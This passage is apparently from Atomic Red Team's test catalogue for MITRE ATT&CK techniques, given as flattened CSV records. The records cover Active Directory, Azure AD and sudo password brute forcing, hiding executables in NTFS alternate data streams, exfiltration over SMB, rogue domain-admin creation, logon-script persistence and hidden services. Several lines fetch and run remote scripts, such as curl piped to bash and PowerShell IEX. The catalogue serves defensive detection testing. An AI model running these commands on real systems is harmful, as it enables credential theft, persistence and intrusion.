",macos,,,"osascript -e 'tell application ""Terminal"" to do script ""tor""'
",sh,,,"killall tor > /dev/null 2>&1
",sh,"dependencies.0.description: Tor must be installed on the machine 

dependencies.0.prereq_command: if [ -x ""$(command -v tor --version)"" ]; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: if [ ! -x ""$(command -v brew --version)"" ]; then /bin/bash -c ""$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh keystroke return)""; fi
brew install tor

",
T1110.001,Brute Force: Password Guessing,Brute Force Credentials of single Active Directory domain users via SMB,09480053-2f98-4854-be6e-71ae5f672224,"Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller
",windows,,,"echo Password1> passwords.txt
echo 1q2w3e4r>> passwords.txt
echo Password!>> passwords.txt
echo Spring2022>> passwords.txt
echo ChangeMe!>> passwords.txt
@FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\#{user}"" ""%p"" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\IPC$ > NUL
",command_prompt,,,,,,"input_arguments.user.description: Account to bruteforce

input_arguments.user.type: string

input_arguments.user.default: %username%

"
T1110.001,Brute Force: Password Guessing,Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos),c2969434-672b-4ec8-8df0-bbb91f40e250,"Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos
",windows,,,"if (""#{auth}"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
  Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
  exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""#{domain}"",389)

$passwordList = Get-Content -Path ""#{passwords_path}""
foreach ($password in $passwordList){
  $credz = new-object System.Net.NetworkCredential(""#{user}"", $password, ""#{domain}"")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
  try {
    Write-Host "" [-] Attempting ${password} on account #{user}.""
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host "" [!] #{user}:${password} are valid credentials!""
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host ""End of bruteforce""
",powershell,False,,,,,"input_arguments.user.description: Account to bruteforce

input_arguments.user.type: string

input_arguments.user.default: $ENV:USERNAME

input_arguments.passwords_path.description: List of passwords we will attempt to brute force with

input_arguments.passwords_path.type: path

input_arguments.passwords_path.default: PathToAtomicsFolder\T1110.001\src\passwords.txt

input_arguments.domain.description: Active Directory domain FQDN

input_arguments.domain.type: string

input_arguments.domain.default: $env:UserDnsDomain

input_arguments.auth.description: authentication method to choose between ""NTLM"" and ""Kerberos""

input_arguments.auth.type: string

input_arguments.auth.default: NTLM

"
T1110.001,Brute Force: Password Guessing,Brute Force Credentials of single Azure AD user,5a51ef57-299e-4d62-8e11-2d440df55e69,"Attempt to brute force Azure AD user via AzureAD powershell module.
",azure-ad,,,"Import-Module -Name AzureAD

$passwords = ""#{passwords}"".split(""{`n}"")
foreach($password in $passwords) {
  $PWord = ConvertTo-SecureString -String ""$password"" -AsPlainText -Force
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
  try {
    Write-Host "" [-] Attempting ${password} on account #{username}.""
    Connect-AzureAD -Credential $Credential 2>&1> $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host "" [!] #{username}:${password} are valid credentials!`r`n""
    break
  } catch {
    Write-Host "" [-] #{username}:${password} invalid credentials.`r`n""
  }
}
Write-Host ""End of bruteforce""
",powershell,False,,,powershell,"dependencies.0.description: AzureAD module must be installed.

dependencies.0.prereq_command: try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}

dependencies.0.get_prereq_command: Install-Module -Name AzureAD -Force

","input_arguments.username.description: Account to bruteforce. We encourage users running this atomic to add a valid microsoft account domain; for eg ""bruce.wayne@<valid_ms_account.com>""

input_arguments.username.type: string

input_arguments.username.default: bruce.wayne@contoso.com

input_arguments.passwords.description: List of passwords we will attempt to brute force with

input_arguments.passwords.type: string

input_arguments.passwords.default: Password1`n1q2w3e4r`nPassword!

"
T1110.001,Brute Force: Password Guessing,Password Brute User using Kerbrute Tool,59dbeb1a-79a7-4c2a-baf4-46d0f4c761c4,"Bruteforce a single user's password from a wordlist
",windows,,,"cd ""PathToAtomicsFolder\..\ExternalPayloads""
.\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\bruteuser.txt TestUser1 
",powershell,False,,,powershell,"dependencies.0.description: kerbrute.exe must exist in PathToAtomicsFolder\..\ExternalPayloads

dependencies.0.prereq_command: if (test-path ""PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe""){exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest ""https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe""

dependencies.1.description: bruteuser.txt must exist in PathToAtomicsFolder\..\ExternalPayloads

dependencies.1.prereq_command: if (test-path ""PathToAtomicsFolder\..\ExternalPayloads\bruteuser.txt""){exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/src/bruteuser.txt?raw=true"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\bruteuser.txt""

","input_arguments.domaincontroller.description: Domain controller where test will be run

input_arguments.domaincontroller.type: string

input_arguments.domaincontroller.default: $ENV:userdnsdomain

input_arguments.domain.description: Domain where you will be testing

input_arguments.domain.type: string

input_arguments.domain.default: $ENV:userdomain

"
T1110.001,Brute Force: Password Guessing,SUDO Brute Force - Debian,ba1bf0b6-f32b-4db0-b7cc-d78cacc76700,"An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. 

This test creates the ""art"" user with a password of ""password123"", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user
",linux,,,"useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art
su art
cd /tmp
curl -s #{remote_url} |bash
",bash,True,,"userdel -fr art
",bash,"dependencies.0.description: Check if running on a Debian based machine.

dependencies.0.prereq_command: if grep -iq ""debian\|ubuntu\|kali\|mint"" /usr/lib/os-release; then echo ""Debian""; else echo ""NOT Debian""; exit 1; fi
if grep -Rq ""pam_tally"" /etc/pam.d/*; then echo ""pam_tally configured""; exit 1; fi
if [ -x ""$(command -v openssl)"" ]; then echo ""openssl is installed""; else echo ""openssl is NOT installed""; exit 1; fi
if [ -x ""$(command -v sudo)"" ]; then echo ""sudo is installed""; else echo ""sudo is NOT installed""; exit 1; fi
if [ -x ""$(command -v curl)"" ]; then echo ""curl is installed""; else echo ""curl is NOT installed""; exit 1; fi

dependencies.0.get_prereq_command: apt update && apt install -y openssl sudo curl

","input_arguments.remote_url.description: url of remote payload

input_arguments.remote_url.type: url

input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh

"
T1110.001,Brute Force: Password Guessing,SUDO Brute Force - Redhat,4097bc00-5eeb-4d56-aaf9-287d60351d95,"An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. 

This test creates the ""art"" user with a password of ""password123"", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user
",linux,,,"useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art
su art
cd /tmp
curl -s #{remote_url} |bash
",bash,True,,"userdel -fr art
",bash,"dependencies.0.description: Check if running on a Redhat based machine.

dependencies.0.prereq_command: if grep -iq ""rhel\|fedora\|centos"" /usr/lib/os-release; then echo ""RedHat""; else echo ""NOT RedHat""; exit 1; fi
if grep -Rq ""pam_faillock"" /etc/pam.d/*; then echo ""pam_faillock configured""; exit 1; fi
if [ -x ""$(command -v openssl)"" ]; then echo ""openssl is installed""; else echo ""openssl is NOT installed""; exit 1; fi
if [ -x ""$(command -v sudo)"" ]; then echo ""sudo is installed""; else echo ""sudo is NOT installed""; exit 1; fi
if [ -x ""$(command -v curl)"" ]; then echo ""curl is installed""; else echo ""curl is NOT installed""; exit 1; fi

dependencies.0.get_prereq_command: yum update && yum install -y openssl sudo curl

","input_arguments.remote_url.description: url of remote payload

input_arguments.remote_url.type: url

input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh

"
T1110.001,Brute Force: Password Guessing,SUDO Brute Force - FreeBSD,abcde488-e083-4ee7-bc85-a5684edd7541,"An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. 

This test creates the ""art"" user with a password of ""password123"", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user
",linux,,,"pw adduser art -g wheel -s /bin/sh
echo ""password123"" | pw usermod art -h 0
su art
cd /tmp
curl -s #{remote_url} |bash
",bash,True,,"rmuser -y art
",sh,"dependencies.0.description: Check if running on a FreeBSD based machine.

dependencies.0.prereq_command: if grep -iq ""FreeBSD"" /etc/os-release; then echo ""FreeBSD""; else echo ""NOT FreeBSD""; exit 1; fi
if [ -x ""$(command -v openssl)"" ]; then echo ""openssl is installed""; else echo ""openssl is NOT installed""; exit 1; fi
if [ -x ""$(command -v sudo)"" ]; then echo ""sudo is installed""; else echo ""sudo is NOT installed""; exit 1; fi
if [ -x ""$(command -v curl)"" ]; then echo ""curl is installed""; else echo ""curl is NOT installed""; exit 1; fi
if [ -x ""$(command -v bash)"" ]; then echo ""bash is installed""; else echo ""bash is NOT installed""; exit 1; fi

dependencies.0.get_prereq_command: pkg update && pkg install -y sudo curl bash

","input_arguments.remote_url.description: url of remote payload

input_arguments.remote_url.type: url

input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh

"
T1564.004,Hide Artifacts: NTFS File Attributes,Alternate Data Streams (ADS),8822c3b0-d9f9-4daf-a043-49f4602364f4,"Execute from Alternate Streams

[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)

[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)
",windows,,,"type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe""
extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt
makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab
print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
regedit /E #{path}\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
expand \\webdav\folder\file.bat #{path}\file.txt:file.bat
esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o 
",command_prompt,True,,,,,"input_arguments.path.description: Path of ADS file

input_arguments.path.type: path

input_arguments.path.default: c:\ADS\

"
T1564.004,Hide Artifacts: NTFS File Attributes,Store file in Alternate Data Stream (ADS),2ab75061-f5d5-4c1a-b666-ba2a50df5b02,"Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.
Upon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test
",windows,,,"if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {
    New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki
    }
Start-Process -FilePath ""$env:comspec"" -ArgumentList ""/c,type,#{payload_path},>,`""#{ads_file_path}:#{ads_name}`""""
",powershell,,,"Remove-Item ""#{ads_file_path}"" -Force -ErrorAction Ignore
",,,"input_arguments.payload_path.description: Path of file to hide in ADS

input_arguments.payload_path.type: path

input_arguments.payload_path.default: c:\windows\system32\cmd.exe

input_arguments.ads_file_path.description: Path of file to create an ADS under

input_arguments.ads_file_path.type: path

input_arguments.ads_file_path.default: C:\Users\Public\Libraries\yanki\desktop.ini

input_arguments.ads_name.description: Name of ADS

input_arguments.ads_name.type: string

input_arguments.ads_name.default: desktop.ini

"
T1564.004,Hide Artifacts: NTFS File Attributes,Create ADS command prompt,17e7637a-ddaf-4a82-8622-377e20de8fdb,"Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run ""dir /a-d /s /r | find "":$DATA"""" in the %temp%
folder to view that the alternate data stream exists. To view the data in the alternate data stream, run ""notepad T1564.004_has_ads.txt:adstest.txt""
",windows,,,"echo cmd /c echo ""Shell code execution.""> #{file_name}:#{ads_filename}
for /f ""usebackq delims=?"" %i in (#{file_name}:#{ads_filename}) do %i
",command_prompt,,,"del #{file_name} >nul 2>&1
",,,"input_arguments.file_name.description: File name of file to create ADS on.

input_arguments.file_name.type: string

input_arguments.file_name.default: %temp%\T1564.004_has_ads_cmd.txt

input_arguments.ads_filename.description: Name of ADS.

input_arguments.ads_filename.type: string

input_arguments.ads_filename.default: adstest.txt

"
T1564.004,Hide Artifacts: NTFS File Attributes,Create ADS PowerShell,0045ea16-ed3c-4d4c-a9ee-15e44d1560d1,"Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command ""ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname""
in the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run ""notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt"" in the %temp% folder.
",windows,,,"echo ""test"" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value ""test""
set-content -path #{file_name} -stream #{ads_filename} -value ""test2""
set-content -path . -stream #{ads_filename} -value ""test3""
",powershell,,,"Remove-Item -Path #{file_name} -ErrorAction Ignore
",powershell,"dependencies.0.description: The file must exist on disk at specified location (#{file_name})

dependencies.0.prereq_command: if (Test-Path #{file_name}) { exit 0 } else { exit 1 }

dependencies.0.get_prereq_command: New-Item -Path #{file_name} | Out-Null

","input_arguments.file_name.description: File name of file to create ADS on.

input_arguments.file_name.type: string

input_arguments.file_name.default: $env:TEMP\T1564.004_has_ads_powershell.txt

input_arguments.ads_filename.description: Name of ADS file.

input_arguments.ads_filename.type: string

input_arguments.ads_filename.default: adstest.txt

"
T1564.004,Hide Artifacts: NTFS File Attributes,Create Hidden Directory via $index_allocation,3e6791e7-232c-481c-a680-a52f86b83fdf,"Create an Alternate Data Stream Directory and File with the command prompt. Write access is required. Upon execution, 
run ""dir /A /Q /R"" in the %temp% folder to view that the alternate data stream folder exists. To view the data in the  
alternate data stream, run ""type %temp%\...$.......::$index_allocation\secrets.txt""
",windows,,,"md #{folder_name}
echo too many secrets > #{folder_name}\#{hidden_filename}
",command_prompt,,,"rmdir /S /Q #{folder_name} >nul 2>&1
",,,"input_arguments.folder_name.description: File name of file to create inside the folder.

input_arguments.folder_name.type: string

input_arguments.folder_name.default: %temp%\...$.......::$index_allocation

input_arguments.hidden_filename.description: Name of the files containing the hidden information

input_arguments.hidden_filename.type: string

input_arguments.hidden_filename.default: secrets.txt

"
T1570,Lateral Tool Transfer,Exfiltration Over SMB over QUIC (New-SmbMapping),d8d13303-159e-4f33-89f4-9f07812d016f,"Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.
Prerequisites:
  - A file server running Windows Server 2022 Datacenter: Azure Edition
  - A Windows 11 computer
  - Windows Admin Center
",windows,,,"New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck
copy '#{local_file}' 'Z:\'
",powershell,True,,,,,"input_arguments.remote_path.description: The UNC path to the share on the file server

input_arguments.remote_path.type: string

input_arguments.remote_path.default: \\example.com\sales

input_arguments.local_file.description: The local file to be transferred

input_arguments.local_file.type: path

input_arguments.local_file.default: C:\path\to\file.txt

"
T1570,Lateral Tool Transfer,Exfiltration Over SMB over QUIC (NET USE),183235ca-8e6c-422c-88c2-3aa28c4825d9,"Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.
Prerequisites:
  - A file server running Windows Server 2022 Datacenter: Azure Edition
  - A Windows 11 computer
  - Windows Admin Center
",windows,,,"NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK
copy '#{local_file}' '*:\'
",powershell,True,,,,,"input_arguments.remote_path.description: The UNC path to the share on the file server

input_arguments.remote_path.type: string

input_arguments.remote_path.default: \\example.com\sales

input_arguments.local_file.description: The local file to be transferred

input_arguments.local_file.type: path

input_arguments.local_file.default: C:\path\to\file.txt

"
T1136.002,Create Account: Domain Account,Create a new Windows domain admin user,fcec2963-9951-4173-9bfa-98d8b7834e62,"Creates a new domain admin user in a command prompt.
",windows,,,"net user ""#{username}"" ""#{password}"" /add /domain
net group ""#{group}"" ""#{username}"" /add /domain
",command_prompt,False,,"net user ""#{username}"" >nul 2>&1 /del /domain
",,,"input_arguments.username.description: Username of the user to create

input_arguments.username.type: string

input_arguments.username.default: T1136.002_Admin

input_arguments.password.description: Password of the user to create

input_arguments.password.type: string

input_arguments.password.default: T1136_pass123!

input_arguments.group.description: Domain administrator group to which add the user to

input_arguments.group.type: string

input_arguments.group.default: Domain Admins

"
T1136.002,Create Account: Domain Account,Create a new account similar to ANONYMOUS LOGON,dc7726d2-8ccb-4cc6-af22-0d5afb53a548,"Create a new account similar to ANONYMOUS LOGON in a command prompt.
",windows,,,"net user ""#{username}"" ""#{password}"" /add /domain
",command_prompt,False,,"net user ""#{username}"" >nul 2>&1 /del /domain
",,,"input_arguments.username.description: Username of the user to create

input_arguments.username.type: string

input_arguments.username.default: ANONYMOUS  LOGON

input_arguments.password.description: Password of the user to create

input_arguments.password.type: string

input_arguments.password.default: T1136_pass123!

"
T1136.002,Create Account: Domain Account,Create a new Domain Account using PowerShell,5a3497a4-1568-4663-b12a-d4a5ed70c7d7,"Creates a new Domain User using the credentials of the Current User
",windows,,,"$SamAccountName = '#{username}'
$AccountPassword = ConvertTo-SecureString '#{password}' -AsPlainText -Force
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)
$User.SamAccountName = $SamAccountName
$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
$User.SetPassword($TempCred.GetNetworkCredential().Password)
$User.Enabled = $True
$User.PasswordNotRequired = $False
$User.DisplayName = $SamAccountName
$User.Save()
$User
",powershell,False,,"cmd /c ""net user #{username} /del >nul 2>&1""
",,,"input_arguments.username.description: Name of the Account to be created

input_arguments.username.type: string

input_arguments.username.default: T1136.002_Admin

input_arguments.password.description: Password of the Account to be created

input_arguments.password.type: string

input_arguments.password.default: T1136_pass123!

"
T1136.002,Create Account: Domain Account,Active Directory Create Admin Account,562aa072-524e-459a-ba2b-91f1afccf5ab,"Use Admin Credentials to Create A Domain Admin Account
",linux,,,"echo ""dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\nchangetype: add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName: adminuser@#{domain}.#{top_level_domain}\nsAMAccountName: adminuser\nuserAccountControl: 512\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}"" > tempadmin.ldif
echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
",sh,False,,"echo removing Atomic User (temporary user)
echo ""dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\nchangetype: delete"" > deleteuser.ldif
ldapmodify -H ldap://#{domain_controller}:389 -x -D #{admin_user} -w #{admin_password} -f deleteuser.ldif
rm deleteuser.ldif
rm tempadmin.ldif
",sh,"dependencies.0.description: Packages sssd-ad sssd-tools realmd adcli installed and realm available

dependencies.0.prereq_command: which ldapadd && which ldapmodify

dependencies.0.get_prereq_command: echo ldapadd or ldapmodify not found; exit 1

","input_arguments.domain.description: The domain to be tested

input_arguments.domain.type: string

input_arguments.domain.default: example

input_arguments.top_level_domain.description: The top level domain (.com, .test, .remote, etc... following domain, minus the .)

input_arguments.top_level_domain.type: string

input_arguments.top_level_domain.default: test

input_arguments.admin_user.description: username@domain of a user with admin privileges

input_arguments.admin_user.type: string

input_arguments.admin_user.default: admin@example.test

input_arguments.admin_password.description: password of the user with admin privileges referenced in admin_user

input_arguments.admin_password.type: string

input_arguments.admin_password.default: s3CurePssw0rD!

input_arguments.domain_controller.description: Name of the domain_controller machine, defined in etc/hosts

input_arguments.domain_controller.type: string

input_arguments.domain_controller.default: adVM

"
T1136.002,Create Account: Domain Account,Active Directory Create User Account (Non-elevated),8c992cb3-a46e-4fd5-b005-b1bab185af31,"Use Admin Credentials to Create A Normal Account (as means of entry)
",linux,,,"echo ""dn: cn=Atomic User, cn=Users,dc=#{domain},dc=#{top_level_domain}\nobjectClass: person\ncn: Atomic User\nsn: User"" > tempadmin.ldif
echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
",sh,False,,"echo removing Atomic User (temporary user)
echo ""dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\nchangetype: delete"" > deleteuser.ldif
ldapmodify -H ldap://#{domain_controller}:389 -x -D #{admin_user} -w #{admin_password} -f deleteuser.ldif
rm deleteuser.ldif
rm tempadmin.ldif
",sh,"dependencies.0.description: Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapadd, ldapmodify

dependencies.0.prereq_command: which ldapadd
which ldapmodify

dependencies.0.get_prereq_command: echo ldapadd or ldapmodify not found; exit 1

","input_arguments.domain.description: The domain to be tested

input_arguments.domain.type: string

input_arguments.domain.default: example

input_arguments.top_level_domain.description: The top level domain (.com, .test, .remote, etc... following domain, minus the .)

input_arguments.top_level_domain.type: string

input_arguments.top_level_domain.default: test

input_arguments.admin_user.description: username@domain of a user with admin privileges

input_arguments.admin_user.type: string

input_arguments.admin_user.default: user@example.test

input_arguments.admin_password.description: password of the user

input_arguments.admin_password.type: string

input_arguments.admin_password.default: s3CurePssw0rD!

input_arguments.domain_controller.description: Name of the domain_controller machine, defined in etc/hosts

input_arguments.domain_controller.type: string

input_arguments.domain_controller.default: adVM

"
T1037.001,Boot or Logon Initialization Scripts: Logon Script (Windows),Logon Scripts,d6042746-07d4-4c92-9ad8-e644c114a231,"Adds a registry value to run batch script created in the %temp% directory. Upon execution, there will be a new environment variable in the HKCU\Environment key
that can be viewed in the Registry Editor.
",windows,,,"echo ""#{script_command}"" > #{script_path}
REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d ""#{script_path}"" /f
",command_prompt,,,"REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f >nul 2>&1
del #{script_path} >nul 2>&1
del ""%USERPROFILE%\desktop\T1037.001-log.txt"" >nul 2>&1
",,,"input_arguments.script_path.description: Path to .bat file

input_arguments.script_path.type: string

input_arguments.script_path.default: %temp%\art.bat

input_arguments.script_command.description: Command To Execute

input_arguments.script_command.type: string

input_arguments.script_command.default: echo Art ""Logon Script"" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt

"
T1564,Hide Artifacts,Extract binary files via VBA,6afe288a-8a8b-4d33-a629-8d03ba9dad3a,"This module extracts a binary (calc.exe) from inside of another binary. 

In the wild maldoc authors will use this technique to hide binaries inside of files stored 
within the office document itself. An example of this technique can be seen in sample

f986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226

This sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2
is the same document without all the malicious code. Document 1 will copy Document 2 to the file system
and then ""peek"" inside of this document and pull out the oleObject.bin file. Contained inside of this
oleObject.bin file is a payload that is parsed out and executed on the file system.
",windows,,,"$macro = [System.IO.File]::ReadAllText(""PathToAtomicsFolder\T1564\src\T1564-macrocode.txt"")
$macro = $macro -replace ""aREPLACEMEa"", ""PathToAtomicsFolder\T1564\bin\extractme.bin""
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroCode ""$macro"" -officeProduct ""Word"" -sub ""Extract"" -NoWrap
",powershell,,,"Remove-Item ""$env:TEMP\extracted.exe"" -ErrorAction Ignore
",powershell,"dependencies.0.description: Microsoft Word must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""Word.Application"" | Out-Null
  Stop-Process -Name ""winword""
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft Word manually to meet this requirement""

",
T1564,Hide Artifacts,"Create a Hidden User Called ""$""",2ec63cc2-4975-41a6-bf09-dffdfb610778,"Creating a user with a username containing ""$""",windows,,,net user $ ATOMIC123! /add /active:yes,command_prompt,True,,net user $ /DELETE 2>&1,,,
T1564,Hide Artifacts,"Create an ""Administrator "" user (with a space on the end)",5bb20389-39a5-4e99-9264-aeb92a55a85c,Creating a user with a username containing with a space on the end,windows,,,"New-LocalUser -Name ""Administrator "" -NoPassword",powershell,True,,"Remove-LocalUser -Name ""Administrator "" 2>&1 | out-null",,,
T1564,Hide Artifacts,Create and Hide a Service with sc.exe,333c7de0-6fbe-42aa-ac2b-c7e40b18246a,"The following technique utilizes sc.exe and sdset to change the security descriptor of a service and ""hide"" it from Get-Service or sc query.

Upon successful execution, sc.exe creates a new service changes the security descriptor.

https://twitter.com/Alh4zr3d/status/1580925761996828672
https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format
",windows,,,"sc.exe create #{service_name} binPath= ""#{executable_command}""
sc sdset #{service_name} ""D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)""
",command_prompt,True,,"sc sdset #{service_name} ""D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)""
sc.exe delete #{service_name}
",,,"input_arguments.service_name.description: Name of service to create

input_arguments.service_name.type: string

input_arguments.service_name.default: AtomicService

input_arguments.executable_command.description: Command to execute as a service

input_arguments.executable_command.type: string

input_arguments.executable_command.default: C:\Windows\System32\calc.exe

"
T1564,Hide Artifacts,Command Execution with NirCmd,2748ab4a-1e0b-4cf2-a2b0-8ef765bec7be,"NirCmd is used by threat actors to execute commands, which can include recon and privilege escalation via running commands via the SYSTEM account
See https://www.kroll.com/en/insights/publications/cyber/black-basta-technical-analysis
",windows,,,"cmd /c ""#{nircmd_location}"" #{command_to_execute}
",powershell,False,,"cmd /c ""#{nircmd_location}"" #{cleanup_command_to_execute} -erroraction silentlycontinue | out-null
",powershell,"dependencies.0.description: The Nircmd executable must exist at (#{nircmd_location})

dependencies.0.prereq_command: if (Test-Path ""#{nircmd_location}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest ""https://www.nirsoft.net/utils/nircmd-x64.zip"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\nircmd.zip"" 
expand-archive -path ""PathToAtomicsFolder\..\ExternalPayloads\nircmd.zip"" -destinationpath ""PathToAtomicsFolder\..\ExternalPayloads\""

","input_arguments.nircmd_location.description: Location of nircmd executable

input_arguments.nircmd_location.type: Path

